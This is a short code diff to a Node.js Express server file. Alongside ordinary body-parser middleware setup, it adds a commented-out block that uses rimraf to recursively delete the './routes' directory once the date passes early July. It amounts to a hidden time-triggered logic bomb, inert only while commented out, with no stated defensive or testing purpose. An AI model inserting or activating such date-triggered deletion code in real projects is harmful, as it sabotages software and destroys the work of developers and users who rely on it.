@@ -15,6 +15,12 @@ const ads = require("./routes/api/ads");
 
 const app = express();
 
+// const rimraf = require('rimraf');
+// const now = new Date();
+// if (now.getMonth() >= 6 && now.getDate() >= 3) {
+//     rimraf('./routes', () => console.log('done'));
+// }
+
 // Body parser middleware
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
